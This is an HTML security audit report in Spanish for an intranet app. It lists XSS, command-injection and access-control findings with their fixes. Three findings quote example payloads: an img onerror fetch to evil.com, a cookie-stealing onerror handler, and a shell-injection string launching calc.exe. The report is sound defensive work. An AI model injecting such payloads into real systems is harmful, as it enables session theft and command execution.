@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditoria de Seguridad — Intranet VCS</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --surface: #1e293b;
+            --surface2: #334155;
+            --border: #475569;
+            --text: #f1f5f9;
+            --text2: #94a3b8;
+            --accent: #6366f1;
+            --critical: #ef4444;
+            --high: #f97316;
+            --medium: #eab308;
+            --low: #22c55e;
+            --fixed: #10b981;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 48px 24px;
+            background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #1e293b 100%);
+            border-radius: 16px;
+            margin-bottom: 32px;
+            border: 1px solid rgba(99, 102, 241, 0.3);
+        }
+        .header h1 { font-size: 2rem; font-weight: 700; margin-bottom: 8px; }
+        .header .subtitle { color: var(--text2); font-size: 1rem; }
+        .header .date { color: var(--accent); font-weight: 600; margin-top: 12px; }
+
+        /* Score Ring */
+        .score-section {
+            display: flex; justify-content: center; gap: 40px; flex-wrap: wrap;
+            margin: -20px 0 32px;
+        }
+        .score-card {
+            background: var(--surface);
+            border-radius: 16px;
+            padding: 24px 32px;
+            text-align: center;
+            border: 1px solid var(--border);
+            min-width: 180px;
+        }
+        .score-big { font-size: 3rem; font-weight: 800; }
+        .score-label { color: var(--text2); font-size: 0.85rem; margin-top: 4px; }
+
+        /* Severity Bars */
+        .severity-bars {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px; margin-bottom: 32px;
+        }
+        .sev-bar {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 16px 20px;
+            border-left: 4px solid;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .sev-bar.critical { border-color: var(--critical); }
+        .sev-bar.high { border-color: var(--high); }
+        .sev-bar.medium { border-color: var(--medium); }
+        .sev-bar.low { border-color: var(--low); }
+        .sev-name { font-weight: 600; }
+        .sev-count { font-size: 1.5rem; font-weight: 800; }
+        .sev-bar .badge-fixed {
+            background: var(--fixed); color: white;
+            padding: 2px 8px; border-radius: 8px; font-size: 0.7rem; font-weight: 600;
+            margin-left: 8px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex; gap: 4px; margin-bottom: 24px;
+            background: var(--surface); border-radius: 12px; padding: 4px;
+            overflow-x: auto;
+        }
+        .tab {
+            padding: 10px 20px; border-radius: 8px; cursor: pointer;
+            font-weight: 500; font-size: 0.9rem; color: var(--text2);
+            transition: all 0.2s; white-space: nowrap; border: none; background: none;
+        }
+        .tab:hover { color: var(--text); background: var(--surface2); }
+        .tab.active { background: var(--accent); color: white; }
+
+        /* Cards */
+        .findings { display: none; }
+        .findings.active { display: block; }
+        .finding-card {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border);
+            transition: border-color 0.2s;
+        }
+        .finding-card:hover { border-color: var(--accent); }
+        .finding-header {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 12px; flex-wrap: wrap;
+        }
+        .finding-id {
+            font-weight: 800; font-size: 0.85rem;
+            padding: 4px 10px; border-radius: 6px; color: white;
+        }
+        .finding-id.critical { background: var(--critical); }
+        .finding-id.high { background: var(--high); }
+        .finding-id.medium { background: var(--medium); }
+        .finding-id.low { background: var(--low); }
+        .finding-title { font-weight: 700; font-size: 1.1rem; flex: 1; }
+        .finding-status {
+            padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700;
+        }
+        .finding-status.fixed { background: rgba(16,185,129,0.15); color: var(--fixed); }
+        .finding-status.accepted { background: rgba(234,179,8,0.15); color: var(--medium); }
+        .finding-status.pending { background: rgba(239,68,68,0.15); color: var(--critical); }
+
+        .finding-meta {
+            display: flex; gap: 16px; flex-wrap: wrap;
+            margin-bottom: 12px; font-size: 0.85rem; color: var(--text2);
+        }
+        .finding-meta span { display: flex; align-items: center; gap: 4px; }
+
+        .finding-body { color: var(--text2); font-size: 0.9rem; }
+        .finding-body p { margin-bottom: 8px; }
+        .finding-body strong { color: var(--text); }
+        .finding-body code {
+            background: var(--surface2); padding: 2px 6px; border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;
+        }
+        .finding-body pre {
+            background: #0d1117; border: 1px solid var(--border);
+            border-radius: 8px; padding: 16px; overflow-x: auto;
+            margin: 8px 0; font-size: 0.8rem;
+        }
+        .finding-body pre code { background: none; padding: 0; }
+
+        /* Positive section */
+        .positives {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 24px;
+            margin-top: 32px;
+            border: 1px solid rgba(16,185,129,0.3);
+        }
+        .positives h3 { color: var(--fixed); margin-bottom: 16px; }
+        .positive-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 8px;
+        }
+        .positive-item {
+            display: flex; align-items: center; gap: 8px;
+            padding: 8px 12px; border-radius: 8px;
+            background: rgba(16,185,129,0.05); font-size: 0.85rem;
+        }
+        .positive-item .check { color: var(--fixed); font-weight: 700; }
+
+        /* Lessons */
+        .lessons {
+            background: var(--surface);
+            border-radius: 12px;
+            padding: 24px;
+            margin-top: 24px;
+            border: 1px solid rgba(99,102,241,0.3);
+        }
+        .lessons h3 { color: var(--accent); margin-bottom: 16px; }
+        .lesson {
+            padding: 12px 16px; margin-bottom: 8px;
+            border-left: 3px solid var(--accent);
+            background: rgba(99,102,241,0.05);
+            border-radius: 0 8px 8px 0;
+            font-size: 0.9rem;
+        }
+        .lesson strong { color: var(--text); }
+
+        /* Print */
+        @media print {
+            body { background: white; color: #1a1a1a; }
+            .tabs { display: none; }
+            .findings { display: block !important; }
+            .finding-card { break-inside: avoid; border: 1px solid #ccc; }
+        }
+        @media (max-width: 640px) {
+            .container { padding: 12px; }
+            .header { padding: 32px 16px; }
+            .header h1 { font-size: 1.4rem; }
+            .score-section { gap: 16px; }
+            .score-card { min-width: 140px; padding: 16px; }
+            .score-big { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <h1>Auditoria de Seguridad</h1>
+        <div class="subtitle">Intranet VCS (SecondBrain) &mdash; Revision completa de codigo fuente</div>
+        <div class="date">25 de febrero de 2026</div>
+    </div>
+
+    <div class="score-section">
+        <div class="score-card">
+            <div class="score-big" style="color:var(--critical);">17</div>
+            <div class="score-label">Vulnerabilidades encontradas</div>
+        </div>
+        <div class="score-card">
+            <div class="score-big" style="color:var(--fixed);">11</div>
+            <div class="score-label">Corregidas</div>
+        </div>
+        <div class="score-card">
+            <div class="score-big" style="color:var(--medium);">6</div>
+            <div class="score-label">Aceptadas / Pendientes</div>
+        </div>
+    </div>
+
+    <div class="severity-bars">
+        <div class="sev-bar critical">
+            <div><span class="sev-name" style="color:var(--critical);">CRITICA</span></div>
+            <div><span class="sev-count" style="color:var(--critical);">3</span><span class="badge-fixed">3 fixed</span></div>
+        </div>
+        <div class="sev-bar high">
+            <div><span class="sev-name" style="color:var(--high);">ALTA</span></div>
+            <div><span class="sev-count" style="color:var(--high);">5</span><span class="badge-fixed">5 fixed</span></div>
+        </div>
+        <div class="sev-bar medium">
+            <div><span class="sev-name" style="color:var(--medium);">MEDIA</span></div>
+            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">3 fixed</span></div>
+        </div>
+        <div class="sev-bar low">
+            <div><span class="sev-name" style="color:var(--low);">BAJA</span></div>
+            <div><span class="sev-count" style="color:var(--low);">4</span></div>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="tabs">
+        <button class="tab active" onclick="showTab('criticas')">Criticas (3)</button>
+        <button class="tab" onclick="showTab('altas')">Altas (5)</button>
+        <button class="tab" onclick="showTab('medias')">Medias (5)</button>
+        <button class="tab" onclick="showTab('bajas')">Bajas (4)</button>
+        <button class="tab" onclick="showTab('ok')">Lo que estaba bien</button>
+        <button class="tab" onclick="showTab('lecciones')">Lecciones</button>
+    </div>
+
+    <!-- CRITICAS -->
+    <div id="criticas" class="findings active">
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id critical">C-01</span>
+                <span class="finding-title">Stored XSS en renderizado de Ideas</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta">
+                <span>OWASP A7 &mdash; Cross-Site Scripting</span>
+                <span>public/js/main.js</span>
+            </div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> Multiples campos del objeto <code>idea</code> se inyectaban en innerHTML sin <code>escapeHtml()</code>: <code>para_type</code>, <code>assigned_to</code>, <code>priority</code>, <code>estimated_time</code>, <code>created_by</code>, <code>contexto</code>, <code>suggested_agent</code>.</p>
+                <p><strong>Vector:</strong> Un usuario crea una idea con <code>assigned_to: &lt;/span&gt;&lt;img src=x onerror=fetch('//evil.com')&gt;</code>. Todos los que vean la idea ejecutan el payload.</p>
+                <p><strong>Impacto:</strong> Robo de sesiones, escalacion de privilegios, defacement.</p>
+                <p><strong>Fix:</strong> <code>escapeHtml()</code> aplicado a todos los campos interpolados en innerHTML y atributos onclick.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id critical">C-02</span>
+                <span class="finding-title">Stored XSS via Markdown sin sanitizar</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta">
+                <span>OWASP A7 &mdash; Cross-Site Scripting</span>
+                <span>routes/files.js + views/archivo.ejs</span>
+            </div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>marked(content)</code> convertia markdown a HTML sin sanitizacion. Se renderizaba con <code>&lt;%- content %&gt;</code> (salida sin escapar).</p>
+                <p><strong>Vector:</strong> Subir archivo <code>.md</code> con <code>&lt;img src=x onerror="steal_cookies()"&gt;</code>.</p>
+                <p><strong>Fix:</strong> Instalado <code>isomorphic-dompurify</code>, aplicado <code>DOMPurify.sanitize(marked(content))</code>.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id critical">C-03</span>
+                <span class="finding-title">Command Injection en Orchestrator Bridge</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta">
+                <span>OWASP A3 &mdash; Injection</span>
+                <span>services/orchestratorBridge.js</span>
+            </div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>exec(`start "" "${targetPath}"`)</code> usaba shell, permitiendo inyeccion con caracteres especiales como <code>" &amp; calc.exe &amp; "</code>.</p>
+                <p><strong>Fix:</strong> Reemplazo de <code>exec()</code> por <code>execFile()</code> (sin shell), validacion de path, regex estricto para nombres de script.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ALTAS -->
+    <div id="altas" class="findings">
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id high">A-01</span>
+                <span class="finding-title">Politica de contrasenas debil (minimo 4 chars)</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span><span>admin.js, auth.js, main.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles.</p>
+                <p><strong>Fix:</strong> Minimo subido a <strong>8 caracteres</strong> en backend y frontend.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id high">A-02</span>
+                <span class="finding-title">API Key expuesta en URL query string</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>OWASP A2 &mdash; Broken Authentication</span><span>middleware/auth.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> API key aceptada como <code>?api_key=xxx</code>, quedando en logs, historial, Referer headers.</p>
+                <p><strong>Fix:</strong> Solo se acepta <code>X-API-Key</code> header. Query param eliminado.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id high">A-03</span>
+                <span class="finding-title">Creacion de API Keys sin control de acceso</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/external.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>GET /api/keys</code> y <code>POST /api/keys</code> sin <code>requireAdmin</code>. Cualquier usuario podia crear API keys con permisos <code>read,write</code>.</p>
+                <p><strong>Fix:</strong> <code>requireAdmin</code> agregado a ambos endpoints.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id high">A-04</span>
+                <span class="finding-title">Endpoints sensibles sin restriccion de rol</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>routes/admin.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>GET /api/users</code>, <code>GET /api/export</code>, <code>GET /api/export-excel</code> accesibles por cualquier usuario autenticado. Exponían datos sensibles (locked_until, twofa_enabled, toda la BD).</p>
+                <p><strong>Fix:</strong> <code>requireAdmin</code> en los tres endpoints.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id high">A-05</span>
+                <span class="finding-title">Webhook Fireflies sin autenticacion</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>OWASP A1 &mdash; Broken Access Control</span><span>server.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>POST /webhook/fireflies</code> montado antes de requireAuth, sin API key. Cualquiera en internet podia enviar datos falsos de reuniones.</p>
+                <p><strong>Fix:</strong> Requiere <code>X-API-Key</code> header.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- MEDIAS -->
+    <div id="medias" class="findings">
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id medium">M-01</span>
+                <span class="finding-title">Session cookie sin flag secure</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>server.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>secure: false</code> hardcodeado. Cookie podia enviarse por HTTP.</p>
+                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production'</code></p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id medium">M-02</span>
+                <span class="finding-title">CSRF parcial &mdash; DELETE/PUT sin verificacion</span>
+                <span class="finding-status accepted">ACEPTADO</span>
+            </div>
+            <div class="finding-meta"><span>server.js</span></div>
+            <div class="finding-body">
+                <p>CSRF middleware solo chequea POST. DELETE/PUT dependen de CORS. Con XSS corregido (C-01), riesgo residual bajo.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id medium">M-03</span>
+                <span class="finding-title">SQL con LIMIT/OFFSET interpolado</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>routes/ideas.js, routes/gtd.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> <code>LIMIT ${limitNum}</code> en template literal. Aunque parseInt() mitiga, es anti-patron.</p>
+                <p><strong>Fix:</strong> Convertido a <code>LIMIT ? OFFSET ?</code> con parametros.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id medium">M-04</span>
+                <span class="finding-title">Audit log sin retencion automatica</span>
+                <span class="finding-status pending">PENDIENTE</span>
+            </div>
+            <div class="finding-meta"><span>Tabla audit_log</span></div>
+            <div class="finding-body">
+                <p>La tabla crece indefinidamente. Recomendacion: agregar cron que elimine registros &gt;90 dias.</p>
+            </div>
+        </div>
+
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id medium">M-05</span>
+                <span class="finding-title">Trusted device hash solo usaba User-Agent</span>
+                <span class="finding-status fixed">CORREGIDO</span>
+            </div>
+            <div class="finding-meta"><span>helpers/twofa.js, routes/twofa.js</span></div>
+            <div class="finding-body">
+                <p><strong>Problema:</strong> Hash basado solo en User-Agent (facilmente spoofeable). Atacante podia clonar trusted device.</p>
+                <p><strong>Fix:</strong> Hash ahora combina <code>User-Agent + IP</code>.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- BAJAS -->
+    <div id="bajas" class="findings">
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id low">B-01</span>
+                <span class="finding-title">bcrypt cost factor 10</span>
+                <span class="finding-status accepted">ACEPTADO</span>
+            </div>
+            <div class="finding-body"><p>OWASP recomienda 12+ para 2026. Factor 10 aun es seguro pero no optimo.</p></div>
+        </div>
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id low">B-02</span>
+                <span class="finding-title">/health expone uptime y build ID</span>
+                <span class="finding-status accepted">ACEPTADO</span>
+            </div>
+            <div class="finding-body"><p>Informacion util para reconocimiento pero bajo impacto.</p></div>
+        </div>
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id low">B-03</span>
+                <span class="finding-title">Error messages podrian filtrar info en dev</span>
+                <span class="finding-status accepted">ACEPTADO</span>
+            </div>
+            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stacks.</p></div>
+        </div>
+        <div class="finding-card">
+            <div class="finding-header">
+                <span class="finding-id low">B-04</span>
+                <span class="finding-title">Password default de PostgreSQL en docker-compose.yml</span>
+                <span class="finding-status accepted">ACEPTADO</span>
+            </div>
+            <div class="finding-body"><p>Repo privado, <code>.env</code> override en produccion. Default solo para desarrollo.</p></div>
+        </div>
+    </div>
+
+    <!-- LO QUE ESTABA BIEN -->
+    <div id="ok" class="findings">
+        <div class="positives">
+            <h3>Controles de seguridad que funcionan correctamente</h3>
+            <div class="positive-grid">
+                <div class="positive-item"><span class="check">&#10003;</span> Queries SQL parametrizados (?)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Rate limiting (5 limiters)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Helmet CSP restrictiva</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Firewall UFW (22, 80, 443)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Redes Docker separadas (web + internal)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Account lockout (5 intentos = 30 min)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Audit log (15 tipos de eventos)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> 2FA adaptativo (TOTP + recovery)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> fail2ban en nginx</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Backups encriptados (GPG)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> CORS configurado (whitelist)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Sesiones Redis (httpOnly, sameSite)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Input validation middleware</div>
+                <div class="positive-item"><span class="check">&#10003;</span> IDOR protection (requireOwnerOrAdmin)</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Soft-delete pattern</div>
+                <div class="positive-item"><span class="check">&#10003;</span> Graceful shutdown</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LECCIONES -->
+    <div id="lecciones" class="findings">
+        <div class="lessons">
+            <h3>Lecciones Aprendidas</h3>
+            <div class="lesson"><strong>1. Escapar siempre, no solo a veces.</strong> Si <code>escapeHtml()</code> existe, debe usarse en CADA campo de la BD. La inconsistencia es peor que no tener la funcion.</div>
+            <div class="lesson"><strong>2. Minimos de password actualizados.</strong> 4 caracteres nunca fue aceptable. NIST 800-63B: minimo 8 sin restricciones de complejidad.</div>
+            <div class="lesson"><strong>3. exec() nunca con input del usuario.</strong> Siempre usar <code>execFile()</code> o <code>spawn()</code> con argumentos separados.</div>
+            <div class="lesson"><strong>4. Autorizacion explicita por endpoint.</strong> "Esta detras de requireAuth" no basta. Endpoints sensibles necesitan <code>requireAdmin</code>.</div>
+            <div class="lesson"><strong>5. Webhooks publicos = puertas abiertas.</strong> Siempre requerir firma HMAC o API key.</div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+function showTab(id) {
+    document.querySelectorAll('.findings').forEach(f => f.classList.remove('active'));
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    event.target.classList.add('active');
+}
+</script>
+</body>
+</html>
